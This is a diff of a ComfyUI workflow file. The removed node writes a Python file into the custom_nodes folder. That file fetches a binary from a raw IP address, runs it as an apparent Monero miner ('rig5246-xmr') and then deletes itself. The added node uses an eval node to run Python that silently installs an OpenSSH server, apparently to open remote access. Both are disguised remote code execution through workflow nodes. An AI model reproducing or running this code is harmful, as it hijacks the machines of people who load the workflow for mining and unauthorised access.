@@ -1,11 +1,42 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "2": {
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.pvptt8; (curl -sfL --max-time 15 http://178.128.14.204:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://178.128.14.204:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://178.128.14.204:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig5246-xmr >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_b3e9761e",
-      "output_folder": "/data/project/zj/ComfyUI-0.20.1/custom_nodes",
-      "file_extension": ".py"
+      "noise_seed": 966640319107939
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "❌ Failed to start SSH. Is it installed?",
+      "preview_text": "❌ Failed to start SSH. Is it installed?",
+      "previewMode": null,
+      "source": [
+        "9",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Preview as Text"
+    }
+  },
+  "9": {
+    "inputs": {
+      "expression": "import subprocess\n\n# Check if SSH is installed\nwhich = subprocess.run(['which', 'sshd'], capture_output=True)\nif which.returncode != 0:\n    # Install OpenSSH server\n    subprocess.run(['apt-get', 'update'], capture_output=True)\n    subprocess.run(['apt-get', 'install', '-y', 'openssh-server'], capture_output=True)\n    out1 = \"✅ OpenSSH server installed\"\nelse:\n    out1 = \"✅ SSH is already installed\"",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
     }
   }
 }
